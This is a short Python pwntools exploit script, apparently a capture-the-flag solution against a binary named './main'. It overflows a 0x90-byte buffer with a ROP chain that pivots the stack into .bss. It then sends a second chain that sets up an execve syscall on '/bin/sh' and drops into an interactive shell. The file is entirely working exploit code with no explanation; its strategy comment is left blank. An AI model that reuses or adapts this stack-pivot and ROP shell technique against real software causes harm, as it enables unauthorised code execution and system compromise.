#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './main'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================

'''
strategy: 

'''

io = initialize()
rop = ROP(exe)

buffer_size = 0x90
ropchain = flat([
    rop.rdi.address,
    elf.bss(),
    rop.rsi.address,
    200,
    elf.sym['readInput'],
    rop.rsp.address,
    elf.bss(),
    rop.ret.address,    
])

payload = flat(
    {buffer_size - len(ropchain): ropchain},
    filler=p64(rop.ret.address)
)

io.sendline(b'2')
io.sendlineafter(b'description:', payload)

ropchain = flat([
    rop.rdi.address,
    elf.bss() + 10 * 8,
    rop.rsi.address,
    0,
    rop.find_gadget(["pop rdx", "pop rbx", "ret"])[0],
    0,
    0,
    rop.rax.address,
    0x3b,
    0x4121e2, # syscall; ret;
    b'/bin/sh\x00',
])

io.sendline(b'3')
io.sendline(ropchain)

io.interactive()